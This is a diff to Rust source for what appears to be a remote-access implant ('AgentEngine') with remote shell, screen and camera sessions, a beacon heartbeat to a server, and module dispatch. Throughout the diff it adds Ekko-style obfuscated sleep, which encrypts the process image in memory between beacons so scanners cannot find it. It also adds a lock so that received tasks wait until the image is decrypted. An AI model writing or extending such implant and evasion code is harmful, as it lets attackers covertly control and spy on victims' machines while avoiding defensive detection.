@@ -33,6 +33,9 @@ pub(crate) struct EngineShared {
     pub shell_session: tokio::sync::Mutex<Option<ShellSession>>,
     pub screen_session: std::sync::Mutex<Option<tokio::sync::watch::Sender<bool>>>,
     pub camera_session: std::sync::Mutex<Option<std::sync::Arc<std::sync::atomic::AtomicBool>>>,
+    /// 串行化「消息处理」与「混淆 sleep」：Ekko 会加密整个镜像，混淆 sleep
+    /// 期间任何执行模块代码的任务都必须等待，否则会踩到密文崩溃。
+    pub process_gate: tokio::sync::Mutex<()>,
 }
 
 impl AgentEngine {
@@ -146,6 +149,7 @@ impl AgentEngine {
             shell_session: tokio::sync::Mutex::new(None),
             screen_session: std::sync::Mutex::new(None),
             camera_session: std::sync::Mutex::new(None),
+            process_gate: tokio::sync::Mutex::new(()),
         });
 
         // Spawn heartbeat task using its own HTTP client, AES-GCM encrypted
@@ -154,6 +158,7 @@ impl AgentEngine {
         let (reconnect_tx, mut reconnect_rx) = tokio::sync::mpsc::unbounded_channel::<()>();
         let hb_mm = module_manager.clone();
         let hb_reconnect = reconnect_tx.clone();
+        let hb_gate = shared.clone();
         tokio::spawn(async move {
             let hb_http = HttpCommunicator::new(&server_url, &register_path, &heartbeat_path, &result_path);
             loop {
@@ -165,66 +170,91 @@ impl AgentEngine {
                     }
                     _ => {}
                 }
-                tokio::time::sleep(std::time::Duration::from_millis(
-                    jittered_interval(hb_interval_ms, hb_jitter),
-                )).await;
+
+                // beacon sleep：空闲时走 Ekko 混淆（加密整个镜像），有
+                // in-flight 消息处理时降级为普通 tokio sleep。
+                let interval_ms = jittered_interval(hb_interval_ms, hb_jitter);
+                if let Ok(_gate) = hb_gate.process_gate.try_lock() {
+                    unsafe { libra_syscalls::obfuscated_sleep(interval_ms as u32) };
+                } else {
+                    tokio::time::sleep(std::time::Duration::from_millis(interval_ms)).await;
+                }
             }
         });
 
         // Main event loop: WS receive + shell output forwarding.
         // The WebSocket is split: ws.receive() doesn't block sends via tx.
         let mut reconnect_delay_ms = 1000u64;
+        let mut do_reconnect = false;
         loop {
-            tokio::select! {
-                _ = reconnect_rx.recv() => {
-                    eprintln!("[INFO] re-registering with server");
-                    break;
-                }
+            // 空闲时短暂让出处理锁，让心跳任务有机会进入 Ekko 混淆 sleep。
+            match shared.process_gate.try_lock() {
+                Ok(_gate) => {
+                    tokio::select! {
+                        _ = reconnect_rx.recv() => {
+                            eprintln!("[INFO] re-registering with server");
+                            do_reconnect = true;
+                        }
 
-                Some(msg) = shell_rx.recv() => {
-                    eprintln!("[SEND] {} | rid={} | data={}",
-                        msg.msg_type,
-                        msg.request_id.as_deref().unwrap_or("-"),
-                        msg.data.as_ref().map(|v| v.to_string()).unwrap_or_else(|| "null".into())
-                    );
-                    send_msg_via(&tx, &msg).await;
-                }
-
-                result = ws.receive() => {
-                    match result {
-                        Some(msg) => {
-                            reconnect_delay_ms = 1000;
-                            eprintln!("[RECV] {} | rid={} | data={}",
+                        Some(msg) = shell_rx.recv() => {
+                            eprintln!("[SEND] {} | rid={} | data={}",
                                 msg.msg_type,
                                 msg.request_id.as_deref().unwrap_or("-"),
                                 msg.data.as_ref().map(|v| v.to_string()).unwrap_or_else(|| "null".into())
                             );
-                            // Dispatch each inbound message as its own task so a
-                            // long-running handler (module execution, network
-                            // collection, …) does not block receiving or handling
-                            // further messages.
-                            let s = shared.clone();
-                            let msg_tx = tx.clone();
-                            let msg_shell_tx = shell_tx.clone();
-                            let mm = module_manager.clone();
-                            tokio::spawn(async move {
-                                crate::engine::dispatcher::dispatch(
-                                    &s, &msg_tx, &msg_shell_tx, &mm, msg,
-                                ).await;
-                            });
+                            send_msg_via(&tx, &msg).await;
                         }
-                        None => {
-                            eprintln!("[WARN] WebSocket disconnected, reconnecting in {}ms...", reconnect_delay_ms);
-                            tokio::time::sleep(std::time::Duration::from_millis(reconnect_delay_ms)).await;
-                            if ws.connect().await.is_ok() {
-                                reconnect_delay_ms = 1000;
-                                self.ws_tx = Some(ws.sender());
-                            } else {
-                                reconnect_delay_ms = (reconnect_delay_ms * 2).min(60_000);
+
+                        result = tokio::time::timeout(std::time::Duration::from_millis(50), ws.receive()) => {
+                            match result {
+                                Ok(Some(msg)) => {
+                                    reconnect_delay_ms = 1000;
+                                    eprintln!("[RECV] {} | rid={} | data={}",
+                                        msg.msg_type,
+                                        msg.request_id.as_deref().unwrap_or("-"),
+                                        msg.data.as_ref().map(|v| v.to_string()).unwrap_or_else(|| "null".into())
+                                    );
+                                    // Dispatch each inbound message as its own task so a
+                                    // long-running handler (module execution, network
+                                    // collection, …) does not block receiving or handling
+                                    // further messages.
+                                    let s = shared.clone();
+                                    let msg_tx = tx.clone();
+                                    let msg_shell_tx = shell_tx.clone();
+                                    let mm = module_manager.clone();
+                                    tokio::spawn(async move {
+                                        // 等混淆 sleep 结束再执行模块代码
+                                        let _g = s.process_gate.lock().await;
+                                        crate::engine::dispatcher::dispatch(
+                                            &s, &msg_tx, &msg_shell_tx, &mm, msg,
+                                        ).await;
+                                    });
+                                }
+                                Ok(None) => {
+                                    eprintln!("[WARN] WebSocket disconnected, reconnecting in {}ms...", reconnect_delay_ms);
+                                    tokio::time::sleep(std::time::Duration::from_millis(reconnect_delay_ms)).await;
+                                    if ws.connect().await.is_ok() {
+                                        reconnect_delay_ms = 1000;
+                                        self.ws_tx = Some(ws.sender());
+                                    } else {
+                                        reconnect_delay_ms = (reconnect_delay_ms * 2).min(60_000);
+                                    }
+                                }
+                                Err(_) => {
+                                    // 50ms 内无消息：释放锁，给心跳混淆 sleep 机会
+                                }
                             }
                         }
                     }
                 }
+                Err(_) => {
+                    // 心跳在混淆 sleep，短暂让出后重试
+                    tokio::time::sleep(std::time::Duration::from_millis(20)).await;
+                }
+            }
+
+            if do_reconnect {
+                break;
             }
         }
 
